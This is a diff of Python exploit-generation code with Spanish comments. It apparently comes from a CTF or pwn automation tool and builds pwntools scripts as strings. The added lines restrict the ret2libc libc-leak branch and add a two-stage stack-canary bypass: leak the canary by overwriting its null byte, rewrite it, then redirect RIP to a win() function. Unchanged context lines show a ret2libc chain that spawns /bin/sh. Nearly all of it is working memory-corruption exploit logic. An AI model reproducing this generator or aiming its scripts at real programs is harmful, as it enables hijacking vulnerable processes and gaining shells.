@@ -3038,7 +3038,14 @@ def _pwn_script(c) -> str:
                 "payload = flat({OFFSET: [ret, WIN]})",
                 "io.sendline(payload)",
                 "io.interactive()"]
-    elif "leak" in strat:                       # ret2libc con fuga de libc
+    elif "leak" in strat and "canary" not in strat:   # ret2libc con fuga de libc (NO canary bypass:
+                                                       # ese "leak" es del canary, no de libc/puts --
+                                                       # bug real: sin esta exclusion, un canary
+                                                       # bypass generaba un script con
+                                                       # elf.got['puts'] aunque el binario no
+                                                       # importe puts; cae ahora en la rama
+                                                       # generica de abajo, que si comprueba
+                                                       # system() antes de asumirlo)
         body = [f"OFFSET = {off}",
                 "rop = ROP(elf)",
                 "rop.raw(rop.find_gadget(['ret']).address)",
@@ -3048,6 +3055,28 @@ def _pwn_script(c) -> str:
                 "libc = elf.libc; libc.address = leak - libc.sym['puts']",
                 "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
                 "io.sendline(flat({OFFSET: rop2.chain()}))",
+                "io.interactive()"]
+    elif "canary" in strat:   # bypass de stack canary: el canary se re-aleatoriza en cada exec
+                              # (incluso con ASLR off), asi que NO se puede fijar como constante
+                              # aqui -- hay que fugarlo y reescribirlo en el MISMO proceso que hace
+                              # el overflow final (igual que el driver verificado de
+                              # autocanary.py). Bug real: un overflow directo a OFFSET sin estas
+                              # dos etapas dispara "*** stack smashing detected ***" porque el
+                              # relleno pisa el canary real con basura antes de llegar a RIP.
+        bufsz = pr.get("bufsz", (off or 8) - 8)
+        rbpgap = pr.get("rbpgap", 8)
+        needs_align = pr.get("align") == "ret"
+        body = [f"BUFSZ = {bufsz}", f"RBPGAP = {rbpgap}", f"WIN = {win}",
+                "# etapa 1: fuga -- machaca solo el byte nulo bajo del canary para que el %s",
+                "# siguiente siga imprimiendo y revele los 7 bytes altos del canary",
+                "io.send(b'A' * BUFSZ + b'B')",
+                "io.recvuntil(b'B', timeout=4)",
+                "leaked = io.recv(7, timeout=4)",
+                "canary = u64(b'\\x00' + leaked)",
+                "io.recvrepeat(0.3)",
+                "# etapa 2: reescribe el MISMO canary (pasa el check) y sobreescribe RIP con win()",
+                ("align = p64(ROP(elf).find_gadget(['ret']).address)" if needs_align else "align = b''"),
+                "io.send(b'A' * BUFSZ + p64(canary) + b'A' * RBPGAP + align + p64(WIN))",
                 "io.interactive()"]
     elif "pie" in strat:
         body = [f"OFFSET = {off}",
